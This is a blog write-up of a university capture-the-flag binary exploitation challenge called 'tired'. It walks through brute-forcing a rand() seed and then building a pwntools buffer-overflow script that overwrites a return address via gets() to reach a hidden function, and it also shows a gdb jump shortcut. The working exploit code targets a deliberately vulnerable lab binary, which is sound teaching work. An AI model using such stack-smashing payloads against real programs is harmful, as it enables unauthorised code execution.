---
title: "Tutor CTF: tired"
description: (450 points) Binary Exploitation Challenge
author: Kevin Zhu
public: true
uploadDate: 2022-04-11 15:57+11:00
lastModified: 2022-04-11 15:57+11:00
notes: ''
prevPage: 38_tutorctf_executable_text_file
nextPage: 40_tutorctf_bus_buddies
tags:
- capture the flag
- tutor ctf
- comp6841
menu:
  groups: [tutorctf]
  submenus: []
name: 39_tutorctf_tired
---

_Contest Source: [COMP6[84]41 CTF](https://www.comp6841.com/challenges)_

> _Note that all flags have been replaced with "COMP6841{REDACTED}". This is to discourage you from just blindly submitting the final answer, and to encourage you to follow along and learn something along the way._


For this problem, we're given a `tired.c` file as well as a corresponding `tired` executubale. The `tired.c` looks like this:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define SLEEP 1
#define YOUTUBE 2
#define WALK_PET 3
#define LECTURE 4
#define SPICY_MOVE 5
#define PLANT_SEED 6
#define OTHER 7
#define FINISH 8

int seed;

// xkcd 221
int getRandomNumber() {

	return 6;	// chosen by fair dice roll
				// guaranteed to be random
}

// User should never eva get here
int unreachable() {

	// 😅
	printf("If you're seeing this, the code is in what I thought was an unreachable state.\n");
	printf("I could give you advice for what to do. But honestly, why should you trust me?\n");
	printf("I clearly screwed this up. I'm writing a message that should never appear, yet I know it will probably appear someday.\n");
	printf("On a deep level, I know I'm not up to this task. [of keeping secrets]\n");

	// print("Something Happens Here. 👀")

	exit(0);
}

int makeMoves(void){
    // I am very tired and for some reason writing this program. But, TRUST ME there are no issues with this program.
	// I am so confident, I'm sharing this code with the best heckers @ UNSW

	printf("The AMAZING 'What Should I Do Generator', for tired people who don't want to think what they should be doing.\n");

	while (1) {
        time_t now = time(&now);

        // printf("It's midnight! What should I do?\n");
        printf("\nIt's %s", ctime(&now));
        printf("What should I do?\n");

        char task[32];
        int move;
        scanf("%d", &move);
        getchar();

		if (move == SLEEP) { /* 1 */
			printf("Uhhh... Okay :( (Sleep is deffo important)\n");
			printf("Wow so glad I have this machine to tell me to sleep!\n");
		} else if (move == YOUTUBE) { /* 2 */
			printf("Watch this now! I dare you!\n");
			printf("https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab\n");
		} else if (move == WALK_PET) { /* 3 */
			printf("I can take my goldfish on a walk?\n");
		} else if (move == LECTURE) { /* 4 */
			printf("A Buckland Lecture? Of course!\n");
		} else if (move == SPICY_MOVE) { /* 5 */
			printf("Playing chess and make an absolute blunder after moving? Tell your opponent you are trying something spicy...\n");
			printf("Hopefully he believes you.\n");
		} else if (move == PLANT_SEED) { /* 6 */
			printf("Can't plant a tree here, but I'll let you plant a different type of seed\n");
			printf("What is your lucky number?\n");
			scanf("%d", &seed);
			getchar();
		} else if (move == OTHER) { /* 7 */

			if (seed) {
				srand(seed);
				if (rand() % 13333337 == getRandomNumber()) {
					printf("Lucky number 6!\n");
				} else {
					printf("Luck wasn't on your side. You don't get to choose!\n");
					exit(1);
				}
			} else {
				printf("Ever thought of planting a tree?\n");
				exit(1);
			}

			printf("Uhh... Okay, let's hear your 'great' idea... :/\n");
			gets(&task);
			printf("%s sounds like a 'great' idea... why did you need me?\n", &task);
		} else if (move == FINISH) { /* 8 */
			printf("BYE!\n");
			break;
		}
		else { /* ![1-8] */
			printf("I was thinking of nothing but `xkcd 2200` writing this program.\n");
			printf("If you're seeing this, the code is in what I thought was a reachable state. Please check that you have made a valid move. I clearly screwed this up. I should make this program more user friendly!\n");
		}
	}
	return 0;
}

int main(void) {

	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	makeMoves();

	exit(0);
}
```

It's alot to digest, but let's go through it step by step. We start out in main, where we call `makeMoves()`. `In makeMoves()`, we're given the option to enter in a move, which can be a number from 1 to 8. For each number we enter, the program will print out a different message or do something different, and then ask for your next move. There's also another function called `unreachable()` which seems pretty suspicious. There's a good a chance that if we manage to call it, we'll be able to get our flag!

So how do we manage to call a function that is never called in `tired.c`? Well there are two approaches: buffer overflow and gdb. Buffer overflow seems like the intended solution, so let's explore that first.

## Approach 1: Buffer Overflow

So many of the moves that we make just do printf, so they're not super useful. However, there are two that stand out. When we enter in 7 (OTHER), we will go through a set of if statements. If the seed is non-zero, and a random number generated from the seed is equal to the output of `getRandomNumber()` modulo 13,333,337, then the code does not exit and proceeds to ask us for a "great" idea. Note that `getRandomNumber()` always returns 6, as a nod to a xkcd 221. If we are able to get this buffer overflow, then we can start writing to the stack, which means that we can replace the return address for the function call to `makeMoves()` with the address of unreachable!

But how do we get our random number to be equal to 6 modulo 13,333,337? Well, turns out we can write a script to bruteforce values for us. In theory, we should only need at most 13,333,337 different possible starting seeds before we find one that works, which is certainly doable by computers. Hence, we can write up a script that looks like this to brute force for us:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

int main () {
	for (int i = 1; i <= 13333337; i++) {
		if (i % 1000 == 0) printf("%d\n", i);
		srand(i);
		if (rand() % 13333337 == 6) {
			printf("found!\n");
			printf("i: %d\n", i);
			break;
		}
	}
}
```

Running this script, we eventually settle on the seed 5703817 after about 10 seconds. Testing this on the tired script, we get:

```term
$ ./tired
The AMAZING 'What Should I Do Generator', for tired people who don't want to think what they should be doing.

It's Mon Apr 11 06:11:32 2022
What should I do?
6
Can't plant a tree here, but I'll let you plant a different type of seed
What is your lucky number?
5703817

It's Mon Apr 11 06:11:39 2022
What should I do?
7
Lucky number 6!
Uhh... Okay, let's hear your 'great' idea... :/

```

In other words, it worked! Now it's also completely possible that our own brute force script uses a slightly different `rand()` library implementation than the one used in `./tired`, meaning that the seed is different. If that were the case, then we would probably have had to use pwntools to interact with the script itself, and manually enter in seeds until we eventually pass the check. I imagine this would be a bit slower though, due to the extra overhead of connecting to the process and printing out all the flavour text.

Anyway, now all we need to do is set up our buffer overflow. First we need the address of `unreachable()` so first what we'll do is we'll use gdb to check the function locations. Running `info functions()` gives us:

```term
$ gdb ./tired
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./tired...
(No debugging symbols found in ./tired)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  setbuf@plt
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  getchar@plt
0x08049070  time@plt
0x08049080  ctime@plt
0x08049090  puts@plt
0x080490a0  exit@plt
0x080490b0  srand@plt
0x080490c0  strlen@plt
0x080490d0  __libc_start_main@plt
0x080490e0  rand@plt
0x080490f0  __isoc99_scanf@plt
0x08049100  _start
0x08049140  _dl_relocate_static_pie
0x08049150  __x86.get_pc_thunk.bx
0x08049160  deregister_tm_clones
0x080491a0  register_tm_clones
0x080491e0  __do_global_dtors_aux
0x08049210  frame_dummy
--Type <RET> for more, q to quit, c to continue without paging--
0x08049212  getRandomNumber
0x08049226  unreachable
0x080493cd  makeMoves
0x080496a9  main
0x080496fe  __x86.get_pc_thunk.ax
0x08049710  __libc_csu_init
0x08049770  __libc_csu_fini
0x08049774  _fini
(gdb)
```

As we can see, unreachable is positioned at address `0x08049226`. To do the buffer overflow, we will start by writing a bunch of A's to overflow the buffer. Then, after writing the exact amount so that we reach the point where the return address is stored, we will print out the address in reverse order (`b"\x26\x92\x04\x08\x01"`) in order to replace it. Note the reverse order, since the executable deals in little endian. Finally, we will enter a move of 8 in order to exit from `makeMoves()` and get to `unreachable()`.

In order to work out exactly how many A's to write, we can either examine the stack in gdb in order to calcualte the exact amount, or write a script to brute force every number of A's. For some reason, the stack method wasn't giving me accurate results, so I resorted to the brute force instead. Here's the script that I used:

```python
from pwn import *
import time

for i in range(32, 100, 4):
    print(i)
    p = process("./tired")

    # set the correct seed
    p.recvuntil(b"What should I do?\n")
    p.sendline(b"6")
    p.recvuntil(b"What is your lucky number?\n")
    p.sendline(b"5703817")
    p.recvuntil(b"What should I do?\n")
    p.sendline(b"7")

    # send the buffer overflow
    p.recvuntil(b"Uhh... Okay, let's hear your 'great' idea... :/\n")
    buffer = b"A"*i + b"\x26\x92\x04\x08"
    print(buffer)
    p.sendline(buffer)

    # exit makeMoves
    p.recvuntil(b"What should I do?\n")
    p.sendline(b"8")
    ret = p.recvall()
    p.close()

    # check if we've found it
    print(ret)
    if b"unreachable" in ret:
        print("Found!")
        break

```

And running the script gave the following output:

```term
$ python3 get.py
32
[+] Starting local process './tired': pid 5952
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
[+] Receiving all data: Done (5B)
[*] Process './tired' stopped with exit code 0 (pid 5952)
b'BYE!\n'
36
[+] Starting local process './tired': pid 5955
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
[+] Receiving all data: Done (5B)
[*] Process './tired' stopped with exit code 0 (pid 5955)
b'BYE!\n'
40
[+] Starting local process './tired': pid 5958
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
[+] Receiving all data: Done (5B)
[*] Process './tired' stopped with exit code 0 (pid 5958)
b'BYE!\n'
44
[+] Starting local process './tired': pid 5961
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
[+] Receiving all data: Done (5B)
[*] Process './tired' stopped with exit code 0 (pid 5961)
b'BYE!\n'
48
[+] Starting local process './tired': pid 5964
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
[+] Receiving all data: Done (5B)
[*] Process './tired' stopped with exit code -4 (SIGILL) (pid 5964)
b'BYE!\n'
52
[+] Starting local process './tired': pid 5968
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
[+] Receiving all data: Done (418B)
[*] Process './tired' stopped with exit code 0 (pid 5968)
b"BYE!\nIf you're seeing this, the code is in what I thought was an unreachable state.\nI could give you advice for what to do. But honestly, why should you trust me?\nI clearly screwed this up. I'm writing a message that should never appear, yet I know it will probably appear someday.\nOn a deep level, I know I'm not up to this task. [of keeping secrets]\nCOMP6841{REDACTED}b1VhrxhLBl6tDEn0Q7SJXFs6uVwASuV4u"
Found!
```

I'm not entirely sure what the `"b1VhrxhLBl6tDEn0Q7SJXFs6uVwASuV4u"` is at the end. It's not base64, and it's not a youtube URL either. But either way, we got our flag :)

## Approach 2: GDB Jump

That was alot of effort, but luckily we can skip most of this. GDB has a nice feature that allows us to jump to any address, simply by using the `jump` command. In this case, we can just jump straight to the relevant function:

```term
$ gdb tired
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from tired...
(No debugging symbols found in tired)
(gdb) break makeMoves
Breakpoint 1 at 0x80493d2
(gdb) run
Starting program: /home/ubuntu/tutor_ctf/tired/tired

Breakpoint 1, 0x080493d2 in makeMoves ()
(gdb) jump unreachable
Continuing at 0x804922a.
If you're seeing this, the code is in what I thought was an unreachable state.
I could give you advice for what to do. But honestly, why should you trust me?
I clearly screwed this up. I'm writing a message that should never appear, yet I know it will probably appear someday.
On a deep level, I know I'm not up to this task. [of keeping secrets]
COMP6841{REDACTED}b1VhrxhLBl6tDEn0Q7SJXFs6uVwASuV4u[Inferior 1 (process 6060) exited normally]
(gdb)
```

And there's the flag!

This method is nice, but does rely on a few things:

1. The `unreachable()` function does not have any checks for things that you had to do in `makeMoves()`
2. That you know the address of `unreachable()` in the first place. Some executables can strip away all function names and addresses, making it much harder to know exactly where to jump to.
3. If this challenge instead required us to `netcat` to a server, we wouldn't have the opportunity to run `gdb` in the first place. Hence, we'd have to resort to the buffer overflow method.

So it's definitely worth learning both in future CTFs.